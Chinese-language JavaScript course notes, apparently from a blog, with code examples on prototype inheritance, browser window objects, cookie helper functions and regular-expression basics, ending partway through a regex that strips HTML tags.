<h2><span id="使用继承">使用继承</span></h2><h3><span id="限制范围的拖拽类">限制范围的拖拽类</span></h3><h4><span id="继承类">继承类</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function LimitDrag(id)</span><br><span class="line">&#123;</span><br><span class="line">	Drag.call(this, id);	//继承属性</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i in Drag.prototype)</span><br><span class="line">&#123;</span><br><span class="line">	LimitDrag.prototype[i]=Drag.prototype[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LimitDrag.prototype.fnMove=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	var l=oEvent.clientX-this.disX;</span><br><span class="line">	var t=oEvent.clientY-this.disY;</span><br><span class="line">	</span><br><span class="line">	if(l&lt;0)</span><br><span class="line">	&#123;</span><br><span class="line">		l=0;</span><br><span class="line">	&#125;</span><br><span class="line">	else if(l&gt;document.documentElement.clientWidth-this.oDiv.offsetWidth)</span><br><span class="line">	&#123;</span><br><span class="line">		l=document.documentElement.clientWidth-this.oDiv.offsetWidth;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	this.oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">	this.oDiv.style.top=t+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4><span id="构造函数伪装">构造函数伪装</span></h4><ul>
<li>属性的继承<br> 原理：欺骗构造函数</li>
<li>call的使用</li>
</ul>
<h5><span id="属性的继承">属性的继承</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function A()</span><br><span class="line">&#123;</span><br><span class="line">	this.abc=12;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//继承A</span><br><span class="line"></span><br><span class="line">function B()</span><br><span class="line">&#123;</span><br><span class="line">	//this-&gt;new B()</span><br><span class="line">	A.call(this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5><span id="call的使用">call的使用</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function show(a, b)</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;this是：&apos;+this+&apos;\na是：&apos;+a+&apos;\nb是：&apos;+b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//show(12, 5);</span><br><span class="line">show.call(&apos;abc&apos;, 12, 5);</span><br></pre></td></tr></table></figure>
<h4><span id="原型链">原型链</span></h4><ul>
<li>方法的继承<br> 原理：复制方法</li>
<li>覆盖原型和方法复制</li>
</ul>
<h5><span id="引用">引用</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var arr1=[1,2,3];</span><br><span class="line">var arr2=arr1;</span><br><span class="line"></span><br><span class="line">arr2.push(4);</span><br><span class="line"></span><br><span class="line">alert(arr1);	//1,2,3,4</span><br><span class="line">alert(arr2);	//1,2,3,4</span><br></pre></td></tr></table></figure>
<h5><span id="方法的继承">方法的继承</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//继承父类方法</span><br><span class="line">for(var i in A.prototype)</span><br><span class="line">&#123;</span><br><span class="line">	B.prototype[i]=A.prototype[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//自己的方法</span><br><span class="line">B.prototype.fn=function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;abc&apos;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2><span id="系统对象">系统对象</span></h2><h3><span id="本地对象非静态对象">本地对象（非静态对象）</span></h3><ul>
<li>什么是本地对象，需要实例化（new）</li>
<li>常用对象<br> Object、Function、Array、String、Boolean、Number、Date、RegExp、Error<h3><span id="内置对象静态对象">内置对象（静态对象）</span></h3></li>
<li>什么是本地对象<br> Global、Math<h3><span id="宿主对象由浏览器提供的对象">宿主对象（由浏览器提供的对象）</span></h3></li>
<li>DOM、BOM</li>
</ul>
<h1><span id="bom应用">BOM应用</span></h1><h2><span id="bom基础">BOM基础</span></h2><h3><span id="打开-关闭窗口">打开、关闭窗口</span></h3><h4><span id="open">open</span></h4><ul>
<li>window.open(‘url’,’_blank’)</li>
<li>window.open有返回值，返回值就是打开的页面</li>
</ul>
<h5><span id="例子运行">例子：运行</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var oNewWin=window.open(&apos;about:blank&apos;, &apos;_blank&apos;);</span><br><span class="line">		</span><br><span class="line">		oNewWin.document.write(oTxt.value);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4><span id="close">close</span></h4><ul>
<li>关闭时提示问题</li>
<li>火狐里不能不用close关闭非open的窗口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.close()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="常用属性">常用属性</span></h3><ul>
<li>window.navigator.userAgent           //当前浏览器版本信息</li>
<li>window.location                      //当前页面的地址，可读取还可赋值</li>
</ul>
<h4><span id="windowlocation">window.location</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location=&apos;http://www.uknow.top&apos;</span><br></pre></td></tr></table></figure>
<h2><span id="尺寸及坐标">尺寸及坐标</span></h2><h3><span id="窗口尺寸-工作区尺寸">窗口尺寸、工作区尺寸</span></h3><h3><span id="可视区尺寸">可视区尺寸</span></h3><ul>
<li>仅跟窗口大小有关</li>
<li>document.documentElement.clientWidth</li>
<li>document.documentElement.clientHeight</li>
</ul>
<h3><span id="滚动距离">滚动距离</span></h3><ul>
<li>随着滚动距离变大</li>
<li>document.body.scrollTop</li>
<li>document.documentElement.scrollTop</li>
</ul>
<h4><span id="兼容写法">兼容写法</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">document.onclick=function ()</span><br><span class="line">&#123;</span><br><span class="line">	//IE、FF</span><br><span class="line">	//alert(document.documentElement.scrollTop);</span><br><span class="line">	</span><br><span class="line">	//chrome</span><br><span class="line">	//alert(document.body.scrollTop);</span><br><span class="line">	</span><br><span class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</span><br><span class="line">	</span><br><span class="line">	alert(scrollTop);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2><span id="常用方法和事件">常用方法和事件</span></h2><h3><span id="系统对话框">系统对话框</span></h3><ul>
<li>警告框：alert(“内容”)，没有返回值</li>
<li>选择框：confirm(“提问的内容”)，返回boolean</li>
<li>输入框：prompt()，返回字符串或null</li>
</ul>
<h4><span id="选择框confirm">选择框：confirm</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var res=confirm(&apos;你是否要删除&apos;);</span><br><span class="line"></span><br><span class="line">alert(res);</span><br></pre></td></tr></table></figure>
<h4><span id="输入框prompt">输入框：prompt</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var res=prompt(&apos;请输入你的姓名&apos;, &apos;blue&apos;);</span><br><span class="line"></span><br><span class="line">alert(res);</span><br></pre></td></tr></table></figure>
<h3><span id="window对象常用事件">window对象常用事件</span></h3><ul>
<li>onload   </li>
<li>onscroll  //当滚动时事件发生</li>
<li>onresize  //当改变时事件发生</li>
</ul>
<h4><span id="例子回到顶部按钮-侧边栏广告">例子：回到顶部按钮、侧边栏广告</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:200px; height:150px; background:red; position:absolute; right:0; bottom:0;&#125;</span><br><span class="line">body &#123;height:2000px;&#125;</span><br><span class="line"></span><br><span class="line">window.onscroll=window.onresize=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.top=document.documentElement.clientHeight-oDiv.offsetHeight+scrollTop+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="闪烁问题">闪烁问题</span></h4><ul>
<li>userAgent&gt;IE6  —&gt;    fixed</li>
<li>IE             —&gt;    运动</li>
</ul>
<h1><span id="cookie基础与应用">COOKIE基础与应用</span></h1><h2><span id="cookie基础">cookie基础</span></h2><h3><span id="什么是cookie">什么是cookie</span></h3><h4><span id="页面用来保存信息">页面用来保存信息</span></h4><ul>
<li>比如：自动登录、记住用户名</li>
</ul>
<h4><span id="cookie的特性">cookie的特性</span></h4><ul>
<li>同一个网站中所有页面共享一套cookie</li>
<li>数量、大小有限</li>
<li>过期时间</li>
</ul>
<h4><span id="js中使用cookie">JS中使用cookie</span></h4><ul>
<li><p>document.cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=&apos;user=blue&apos;;		//添加</span><br><span class="line">document.cookie=&apos;pass=123456&apos;;</span><br><span class="line"></span><br><span class="line">alert(document.cookie);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Date()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var oDate=new Date();</span><br><span class="line"></span><br><span class="line">oDate.setDate(oDate.getDate()+800000);</span><br><span class="line"></span><br><span class="line">alert(oDate.getFullYear()+&apos;-&apos;+(oDate.getMonth()+1)+&apos;-&apos;+oDate.getDate());</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="使用cookie-1">使用cookie - 1</span></h2><h3><span id="cookie的使用">cookie的使用</span></h3><h4><span id="设置cookie">设置cookie</span></h4><ul>
<li>格式：名字=值</li>
<li>不会覆盖</li>
<li>过期时间：expires=时间<br> 日期对象的使用</li>
<li>封装函数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function setCookie(name, value, iDay)</span><br><span class="line">&#123;</span><br><span class="line">	var oDate=new Date();</span><br><span class="line">	oDate.setDate(oDate.getDate()+iDay);</span><br><span class="line">	</span><br><span class="line">	document.cookie=name+&apos;=&apos;+value+&apos;;expires=&apos;+oDate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="读取cookie">读取cookie</span></h4><ul>
<li>字符串分割</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function getCookie(name)</span><br><span class="line">&#123;</span><br><span class="line">	var arr=document.cookie.split(&apos;; &apos;);</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;arr.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		var arr2=arr[i].split(&apos;=&apos;);</span><br><span class="line">		</span><br><span class="line">		if(arr2[0]==name)</span><br><span class="line">		&#123;</span><br><span class="line">			return arr2[1];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	return &apos;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="删除cookie">删除cookie</span></h4><ul>
<li>已经过期</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function removeCookie(name)</span><br><span class="line">&#123;</span><br><span class="line">	setCookie(name, 1, -1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="封装函数">封装函数</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">function setCookie(name, value, iDay)</span><br><span class="line">&#123;</span><br><span class="line">	var oDate=new Date();</span><br><span class="line">	oDate.setDate(oDate.getDate()+iDay);</span><br><span class="line">	</span><br><span class="line">	document.cookie=name+&apos;=&apos;+value+&apos;;expires=&apos;+oDate;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getCookie(name)</span><br><span class="line">&#123;</span><br><span class="line">	var arr=document.cookie.split(&apos;; &apos;);</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;arr.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		var arr2=arr[i].split(&apos;=&apos;);</span><br><span class="line">		</span><br><span class="line">		if(arr2[0]==name)</span><br><span class="line">		&#123;</span><br><span class="line">			return arr2[1];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	return &apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function removeCookie(name)</span><br><span class="line">&#123;</span><br><span class="line">	setCookie(name, 1, -1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*setCookie(&apos;userName&apos;, &apos;dancingblue&apos;, 365);</span><br><span class="line">setCookie(&apos;password&apos;, &apos;123456&apos;, 14);*/</span><br><span class="line"></span><br><span class="line">//alert(document.cookie);</span><br><span class="line">//alert(getCookie(&apos;sex&apos;));</span><br><span class="line">removeCookie(&apos;password&apos;);</span><br><span class="line">alert(document.cookie);</span><br></pre></td></tr></table></figure>
<h2><span id="使用cookie-2">使用cookie - 2</span></h2><h3><span id="cookie的使用">cookie的使用</span></h3><h4><span id="例子">例子</span></h4><p>用cookie记录上次登录的用户名</p>
<ul>
<li>提交时——记录用户名</li>
<li>window.onload——读取用户名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">function setCookie(name, value, iDay)</span><br><span class="line">&#123;</span><br><span class="line">	var oDate=new Date();</span><br><span class="line">	oDate.setDate(oDate.getDate()+iDay);</span><br><span class="line">	</span><br><span class="line">	document.cookie=name+&apos;=&apos;+value+&apos;;expires=&apos;+oDate;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getCookie(name)</span><br><span class="line">&#123;</span><br><span class="line">	var arr=document.cookie.split(&apos;; &apos;);</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;arr.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		var arr2=arr[i].split(&apos;=&apos;);</span><br><span class="line">		</span><br><span class="line">		if(arr2[0]==name)</span><br><span class="line">		&#123;</span><br><span class="line">			return arr2[1];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	return &apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function removeCookie(name)</span><br><span class="line">&#123;</span><br><span class="line">	setCookie(name, 1, -1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oForm=document.getElementById(&apos;form1&apos;);</span><br><span class="line">	var oUser=document.getElementsByName(&apos;user&apos;)[0];</span><br><span class="line">	</span><br><span class="line">	oForm.onsubmit=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		setCookie(&apos;user&apos;, oUser.value, 14);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	oUser.value=getCookie(&apos;user&apos;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;1form id=&quot;form1&quot; action=&quot;http://www.zhinengshe.com/&quot;&gt;</span><br><span class="line">	用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt;&lt;br&gt;</span><br><span class="line">    密码：&lt;input type=&quot;password&quot; name=&quot;pass&quot; /&gt;&lt;br&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; value=&quot;登陆&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="js中的正则表达式">JS中的正则表达式</span></h1><h2><span id="正则表达式基础-1">正则表达式基础 - 1</span></h2><h3><span id="复习字符串操作">复习字符串操作</span></h3><ul>
<li>search            查找</li>
<li>substring        获取子字符串</li>
<li>charAt            获取某个字符</li>
<li>split            分割字符串，获得数组</li>
</ul>
<h4><span id="search">search</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;abcdef&apos;;</span><br><span class="line"></span><br><span class="line">alert(str.search(&apos;u&apos;));		//位置, -1</span><br></pre></td></tr></table></figure>
<h4><span id="substring">substring</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;abcdef&apos;;</span><br><span class="line"></span><br><span class="line">//alert(str.substring(2, 5));	//不包括结束位置</span><br><span class="line">alert(str.substring(1));</span><br></pre></td></tr></table></figure>
<h4><span id="charat">charAt</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;abcdef&apos;;</span><br><span class="line"></span><br><span class="line">alert(str.charAt(0));</span><br></pre></td></tr></table></figure>
<h3><span id="split">split</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;12-56-aaa-89&apos;;</span><br><span class="line">var arr=str.split(&apos;-&apos;);</span><br><span class="line"></span><br><span class="line">alert(arr)</span><br></pre></td></tr></table></figure>
<h3><span id="找出字符串中的所有数字">找出字符串中的所有数字</span></h3><ul>
<li>用传统字符串操作完成</li>
<li>用正则表达式完成</li>
</ul>
<h4><span id="传统操作">传统操作</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;12 fff 87 er334 233 -=-=fa80&apos;;</span><br><span class="line">var arr=[];</span><br><span class="line">var tmp=&apos;&apos;;</span><br><span class="line"></span><br><span class="line">for(var i=0;i&lt;str.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">	if(str.charAt(i)&gt;=&apos;0&apos; &amp;&amp; str.charAt(i)&lt;=&apos;9&apos;)</span><br><span class="line">	&#123;</span><br><span class="line">		tmp+=str.charAt(i);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		if(tmp)</span><br><span class="line">		&#123;</span><br><span class="line">			arr.push(tmp);</span><br><span class="line">			tmp=&apos;&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(tmp)</span><br><span class="line">&#123;</span><br><span class="line">	arr.push(tmp);</span><br><span class="line">	tmp=&apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alert(arr);</span><br></pre></td></tr></table></figure>
<h4><span id="正则操作">正则操作</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;12 fff 87 er334 233 -=-=fa80&apos;;</span><br><span class="line"></span><br><span class="line">alert(str.match(/\d+/g));</span><br></pre></td></tr></table></figure>
<h2><span id="正则表达式基础-2">正则表达式基础 - 2</span></h2><h3><span id="什么是正则表达式">什么是正则表达式</span></h3><ul>
<li>什么叫“正则”<br> 规则、模式</li>
<li>强大的字符串匹配工具</li>
<li>是一种正常人类很难读懂的文字</li>
<li>RegExp对象<br> JS风格——new RegExp(“a”, “i”)<br> perl风格——/a/i</li>
</ul>
<h4><span id="js风格">JS风格</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var re=new RegExp(&apos;b&apos;, &apos;i&apos;);  //i 忽略大小写</span><br><span class="line">var str=&apos;abcdef&apos;;</span><br><span class="line"></span><br><span class="line">alert(str.search(re));</span><br></pre></td></tr></table></figure>
<h4><span id="perl风格">perl风格</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var re=/a/i;</span><br><span class="line">var str=&apos;abcdef&apos;;</span><br><span class="line"></span><br><span class="line">alert(str.search(re));</span><br></pre></td></tr></table></figure>
<h2><span id="字符串与正则配合-1">字符串与正则配合 - 1</span></h2><h3><span id="search">search</span></h3><h4><span id="字符串搜索">字符串搜索</span></h4><ul>
<li>返回出现的位置</li>
<li>忽略大小写：i——ignore</li>
<li>判断浏览器类型</li>
</ul>
<h3><span id="match">match</span></h3><h3><span id="获取匹配的项目">获取匹配的项目</span></h3><ul>
<li>量词：+</li>
<li>量词变化：\d、\d\d和\d+</li>
<li>全局匹配：g——global</li>
<li>例子：找出所有数字</li>
</ul>
<h4><span id="例子找出所有数字">例子：找出所有数字</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;asdf 34 656 cvs33&apos;;</span><br><span class="line">var re=/\d+/g;</span><br><span class="line"></span><br><span class="line">alert(str.match(re));</span><br></pre></td></tr></table></figure>
<h2><span id="字符串与正则配合-2">字符串与正则配合 - 2</span></h2><h3><span id="replace">replace</span></h3><h4><span id="替换所有匹配">替换所有匹配</span></h4><ul>
<li>返回替换后的字符串</li>
<li>例子：敏感词过滤<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;abc aaa erw&apos;;</span><br><span class="line">var re=/a/g;</span><br><span class="line"></span><br><span class="line">alert(str.replace(re, &apos;0&apos;));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="字符串-1">字符串 - 1</span></h2><h3><span id="任意字符">任意字符</span></h3><ul>
<li>[abc]    或<br> 例子：o[usb]t——obt、ost、out</li>
</ul>
<h3><span id="范围">范围</span></h3><ul>
<li>[a-z]、[0-9]<br>  例子：id[0-9]——id0、id5</li>
</ul>
<h3><span id="排除">排除</span></h3><ul>
<li>[^a]<br>   例子：o[^0-9]t——oat、o?t、o t</li>
</ul>
<h2><span id="字符串-2">字符串 - 2</span></h2><h3><span id="组合">组合</span></h3><ul>
<li>[a-z0-9A-Z]</li>
</ul>
<h3><span id="实例偷小说">实例：偷小说</span></h3><ul>
<li>过滤HTML标签<br>   自定义innerText方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTxt1=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">	var oTxt2=document.getElementById(&apos;txt2&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var re=/&lt;[^&lt;&gt;]+&gt;/g;</span><br><span class="line">		</span><br><span class="line">		